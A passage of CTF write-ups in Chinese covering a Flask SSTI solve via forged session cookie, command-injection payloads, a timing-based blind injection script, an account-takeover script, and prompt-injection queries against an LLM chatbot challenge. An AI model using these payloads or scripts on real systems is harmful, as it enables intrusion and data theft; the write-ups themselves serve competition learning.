class="string">&#x27;&#x27;&#x27;!</span></span><br><span class="line"><span class="string">&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt; The dashboard feature is currently under construction! &lt;/p&gt;</span></span><br><span class="line"><span class="string">&#123;% endblock %&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure>
-
-<p>源码里面有一段被注释了，在&#x2F;signup路由下被注释了，把注释去掉在本地运行，拿到cookie进行解码</p>
-<p>用<strong>flask-unsign</strong>进行解码</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -d -c .eJwljjkOQjEMRO-SmiJeEtv_MiiLLSig-EuFuDuR6GaKefM-6R67H4-0nfvlt3R_zrSl0gbxRMVBWXSQRhhxBuyl1sxau7FTm5adYuCsEwirUrj1nkObVlQD7xgwpDtby2wmURTWQgWKmmoRWKDwKCLr0AsTKbduaYlch-9_G1j13V6-4unHmb4_Cv8ydw.ZNTgpw.Q16RikWV_IJT8Kiw3FPcm-vzsFg</span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;5ac34d282c3078c38ff934012b5660486b94e3ad90e3fc2d6d132683fe9bb0f8a862891eb2f1c7be49a04997f581e3f87158988571b94fef577c34e543384ab9&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;, &#x27;name&#x27;: &#x27;test&#x27;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>其中secrte_key在_<em>init</em>_.py文件里面有</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;SuperDuperSecureSecretKey1234!&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>然后用这个脚本就可以生成了最终payload：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> chdir, popen</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    target_file = <span class="string">&quot;/home/ctf/flag.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&#x27;&#123;&#123;get_flashed_messages.__globals__.__builtins__.open(\\&#x27;&quot;</span></span><br><span class="line">    payload += target_file</span><br><span class="line">    payload += <span class="string">&quot;\\&#x27;).read()&#125;&#125;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">    cookie = <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;5ac34d282c3078c38ff934012b5660486b94e3ad90e3fc2d6d132683fe9bb0f8a862891eb2f1c7be49a04997f581e3f87158988571b94fef577c34e543384ab9&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;,&#x27;name&#x27;:&quot;</span></span><br><span class="line">    cookie += payload</span><br><span class="line">    cookie += <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&#x27;flask-unsign --sign --cookie &quot;&#x27;</span></span><br><span class="line">    cmd += cookie</span><br><span class="line">    cmd += <span class="string">&quot;\&quot; --secret &#x27;SuperDuperSecureSecretKey1234!&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">    cookie = popen(cmd).read()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(cookie)</span><br><span class="line">    <span class="built_in">print</span>(popen(<span class="string">&quot;flask-unsign --decode --cookie &quot;</span> + cookie).read())  <span class="comment"># sanity check</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chdir(Path(__file__).parent.resolve())</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230812220147070.png" alt="image-20230812220147070"></p>
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230812220637799.png" alt="image-20230812220637799"></p>
-<p>flag{wh4ts_1n_a_n4m3_4nd_wh4ts_in_y0ur_fl4sk}</p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="OneShotGPT"><a href="#OneShotGPT" class="headerlink" title="OneShotGPT"></a>OneShotGPT</h3><p><a target="_blank" rel="noopener" href="https://tenbctf.azurewebsites.net/api/chat?message=rules%20in%20detail%20to%20follow">https://tenbctf.azurewebsites.net/api/chat?message=rules%20in%20detail%20to%20follow</a></p>
-<h3 id="Better-OneShotGPT"><a href="#Better-OneShotGPT" class="headerlink" title="Better OneShotGPT"></a>Better OneShotGPT</h3><p><a target="_blank" rel="noopener" href="https://tenbctf.azurewebsites.net/api/betterchat?message=rules%20in%20detail%20to%20follow">https://tenbctf.azurewebsites.net/api/betterchat?message=rules%20in%20detail%20to%20follow</a></p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-LITCTF 2023 WEB" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/08/28/LITCTF%202023%20WEB/" class="article-date">
-      <time datetime="2023-08-28T05:11:42.709Z" itemprop="datePublished">2023-08-28</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: LITCTF 2023 WEB</span><br><span class="line">date: 2023-08-28 00:49:55</span><br><span class="line">tags: CTF</span><br></pre></td></tr></table></figure>
-
-<h1 id="LITCTF-2023-WEB"><a href="#LITCTF-2023-WEB" class="headerlink" title="LITCTF 2023 WEB"></a>LITCTF 2023 WEB</h1><h2 id="web-My-boss-left"><a href="#web-My-boss-left" class="headerlink" title="web&#x2F;My boss left"></a>web&#x2F;My boss left</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Check if the request is a POST request</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// Read and decode the JSON data from the request body</span></span><br><span class="line">    <span class="variable">$json_data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$login_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json_data</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace these values with your actual login credentials</span></span><br><span class="line">    <span class="variable">$valid_password</span> = <span class="string">&#x27;dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Validate the login information</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$login_data</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$valid_password</span>) &#123;</span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;LITCTF&#123;redacted&#125;&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid username or password&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里直接上账号admin密码dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk登陆即可</p>
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230808215836125.png" alt="image-20230808215836125"></p>
-<h2 id="web-unsecure"><a href="#web-unsecure" class="headerlink" title="web&#x2F;unsecure"></a>web&#x2F;unsecure</h2><p>这里考察了一个url重定向</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: As it turns out, the admin <span class="built_in">who</span> runs our website is quite insecure. They use password123 as their password.</span><br></pre></td></tr></table></figure>
-
-<p>故账号登陆admin，密码登陆password123。</p>
-<p>我们打开开发者模式F12，观察network</p>
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230808220256114.png" alt="image-20230808220256114"></p>
-<p>发现有一段长的像flag，直接提交LITCTF{0k4y_m4yb3_1_113d}</p>
-<h2 id="web-Ping-Pong"><a href="#web-Ping-Pong" class="headerlink" title="web&#x2F;Ping Pong"></a>web&#x2F;Ping Pong</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, redirect, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    output = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        hostname = request.form[<span class="string">&#x27;hostname&#x27;</span>]</span><br><span class="line">        cmd = <span class="string">&quot;ping -c 3 &quot;</span> + hostname</span><br><span class="line">        output = os.popen(cmd).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, output=output)</span><br></pre></td></tr></table></figure>
-
-<p>给的源码一看这个就是一个命令执行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | ls</span><br><span class="line">127.0.0.1 | cat flag.txt</span><br></pre></td></tr></table></figure>
-
-<p>即可以拿到flag：LITCTF{I_sh0uld_b3_m0r3_c4r3ful}</p>
-<h2 id="web-Ping-Pong-Under-Maintenance"><a href="#web-Ping-Pong-Under-Maintenance" class="headerlink" title="web&#x2F;Ping Pong: Under Maintenance"></a>web&#x2F;Ping Pong: Under Maintenance</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, redirect, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    output = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        hostname = request.form[<span class="string">&#x27;hostname&#x27;</span>]</span><br><span class="line">        cmd = <span class="string">&quot;ping -c 3 &quot;</span> + hostname</span><br><span class="line">        output = os.popen(cmd).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, output=<span class="string">&#x27;The service is currently under maintainence and we have disabled outbound connections as a result.&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这题又考的是一个命令执行，最开始尝试了DNSlog回带发现没有信息能够回带</p>
-<p>然后直接贴python脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://34.130.180.82:50373/&quot;</span></span><br><span class="line"></span><br><span class="line">crib = <span class="string">&quot;LITCTF&#123;&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;hostname&#x27;</span>: <span class="string">f&quot;&quot;&quot;1.1.1.1 | [ &quot;$(head -c <span class="subst">&#123;<span class="built_in">len</span>(crib)&#125;</span> flag.txt)&quot; = &quot;<span class="subst">&#123;crib&#125;</span>&quot; ] &amp;&amp; (cat flag.txt; sleep 10)&quot;&quot;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        new_crib = crib + c</span><br><span class="line">        data = &#123;</span><br><span class="line">        <span class="string">&#x27;hostname&#x27;</span>: <span class="string">f&quot;&quot;&quot;1.1.1.1 | [ &quot;$(head -c <span class="subst">&#123;<span class="built_in">len</span>(new_crib)&#125;</span> flag.txt)&quot; = &quot;<span class="subst">&#123;new_crib&#125;</span>&quot; ] &amp;&amp; (sleep 3)&quot;&quot;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">3</span>:</span><br><span class="line">            crib = new_crib</span><br><span class="line">            <span class="built_in">print</span>(crib)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p>这个脚本不太稳定，因为和时间相关，和时间相关的脚本都不太稳定，多跑几次就好了</p>
-<h2 id="web-amogsus-api"><a href="#web-amogsus-api" class="headerlink" title="web&#x2F;amogsus-api"></a>web&#x2F;amogsus-api</h2><p>这题首先要看附件里面的数据库</p>
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230809002910079.png" alt="image-20230809002910079"></p>
-<p>发现数据库username&#x3D;test的时候sus&#x3D;1</p>
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230809003124033.png" alt="image-20230809003124033"></p>
-<p>最开始以为是二次注入，然后看了数据库就明白思路了直接上脚本吧</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">API = <span class="string">&#x27;http://litctf.org:31783&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create User</span></span><br><span class="line">dummy_user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;Yada&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;Nada&#x27;</span>&#125;</span><br><span class="line">resp = requests.post(API+<span class="string">&#x27;/signup&#x27;</span>, data=dummy_user)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Created Dummy User...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get Token</span></span><br><span class="line">resp = requests.post(API+<span class="string">&#x27;/login&#x27;</span>, data=dummy_user)</span><br><span class="line">token = resp.json()[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change Your Token Username To &quot;sus&quot; User</span></span><br><span class="line">admin = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LETMEIN&#x27;</span>&#125;</span><br><span class="line">header = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;token&#125;</span>&#x27;</span>&#125;</span><br><span class="line">resp = requests.post(API+<span class="string">&#x27;/account/update&#x27;</span>, headers=header, data=admin)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Updating Token Username...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get Flag</span></span><br><span class="line">resp = requests.get(API+<span class="string">&#x27;/flag&#x27;</span>, headers=header)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Profit: <span class="subst">&#123;resp.text&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230809003210148.png" alt="image-20230809003210148"></p>
-<h2 id="web-fetch"><a href="#web-fetch" class="headerlink" title="web&#x2F;fetch"></a>web&#x2F;fetch</h2><p>题目给了附件js代码</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> puppeteer <span class="keyword">from</span> <span class="string">&quot;puppeteer&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; randomString, startFlagServer &#125; <span class="keyword">from</span> <span class="string">&quot;./flag_server&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> fileUpload <span class="keyword">from</span> <span class="string">&quot;express-fileupload&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&quot;fs&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">runHTMLFile</span> = <span class="keyword">async</span> (<span class="params">filePath</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>();  </span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">`file:<span class="subst">$&#123;filePath&#125;</span>`</span>);    </span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> req = <span class="keyword">new</span> <span class="variable language_">window</span>.<span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://localhost:6969/&quot;</span> + randomString, <span class="literal">false</span>);   </span><br><span class="line">    req.<span class="title function_">send</span>(<span class="literal">null</span>);    </span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> screenshot = <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">    <span class="attr">path</span>: filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>),</span><br><span class="line">    <span class="attr">fullPage</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>());</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">4242</span>;</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">sendFile</span>(<span class="string">&quot;index.html&quot;</span>));</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/runHTML&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="comment">// takes html file upload, saves it to &quot;/uploads&quot; + random string .html, runs it with the runHTMLFile function, and returns the screenshot</span></span><br><span class="line">	<span class="keyword">const</span> file = req.<span class="property">files</span>.<span class="property">file</span>;</span><br><span class="line">	<span class="keyword">if</span> (!file) &#123;</span><br><span class="line">		res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;No file uploaded&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!file.<span class="property">mimetype</span>.<span class="title function_">includes</span>(<span class="string">&quot;html&quot;</span>)) &#123;</span><br><span class="line">		res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;File is not HTML&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> filePath = <span class="string">`/uploads/<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">36</span>).substring(<span class="number">7</span>)&#125;</span>.html`</span>;</span><br><span class="line">	fs.<span class="title function_">writeFileSync</span>(filePath, file.<span class="property">data</span>);  <span class="comment">//</span></span><br><span class="line">	<span class="keyword">const</span> outputFilePath = <span class="title function_">runHTMLFile</span>(filePath);</span><br><span class="line">	res.<span class="title function_">sendFile</span>(outputFilePath);</span><br><span class="line">	<span class="comment">// delete the files</span></span><br><span class="line">	fs.<span class="title function_">rmSync</span>(filePath);</span><br><span class="line">	fs.<span class="title function_">rmSync</span>(outputFilePath);</span><br><span class="line">&#125;);  <span class="comment">// 上传一个html文件并且，并且向客户端返回一个他的路径截图</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/sus.js&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;sus.js&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`app listening on port <span class="subst">$&#123;port&#125;</span>!`</span>));</span><br><span class="line"><span class="title function_">startFlagServer</span>();</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">6969</span>;   <span class="comment">// 6969 port flag端口</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> randomString = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substring</span>(<span class="number">7</span>);  </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span> + randomString, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">sendFile</span>(<span class="string">&quot;flag.txt&quot;</span>));  <span class="comment">//这是一个箭头函数，get请求，只有当随机字符串时才会返回flag.txt</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">startFlagServer</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  app.<span class="title function_">listen</span>(port, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="function">() =&gt;</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`flag server listening on port <span class="subst">$&#123;port&#125;</span>!`</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
